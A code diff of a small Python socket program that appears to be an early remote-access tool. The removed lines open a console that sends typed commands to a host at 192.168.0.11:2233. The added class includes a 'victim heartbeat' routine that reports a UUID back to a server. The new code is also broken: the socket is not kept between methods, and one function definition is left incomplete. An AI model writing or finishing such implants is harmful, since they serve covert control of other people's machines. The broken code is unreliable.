@@ -1,30 +1,35 @@
 import socket
 import time
 
-while True:
-	sock = socket.socket()
-	HOST = "192.168.0.11"
-	PORT = 2233
-	sock.connect((HOST, PORT))
-	#发送模式
-	sock.sendall("i'm your father".encode())
-	server = sock.recv(1024).decode()
 
-	print(server)
+class Socketz():
 
-	sock.sendall("i'm your father".encode())
-
-	print(sock.recv(1024).decode())
-
-	while True:
-
-		cmd = input(">>")
-
-		sock.sendall(cmd.encode())
-		print(sock.recv(1024).decode())
+	def __init__(self,host,port,data=""):
+		self.host = host
+		self.port = port
+		self.data = data
 
 
+	def connect(self):
+		sock = socket.socket()
+		HOST = self.host
+		PORT = self.port
+		sock.connect((HOST, PORT))
+		return None
+	 
+
+	def heart(self):
+		#发送被害心跳的函数
+		sock.send("heart".encode("utf-8"))
+		my = sock.recv(1024).decode("utf-8")
+		#发送uuid
+		sock.send(self.data.encode("utf-8"))
+		server_rec = sock.recv(1024).decode("utf-8")
+
+		return server_rec
+
+
+	def ()
 
 
 
-	time.sleep(5)
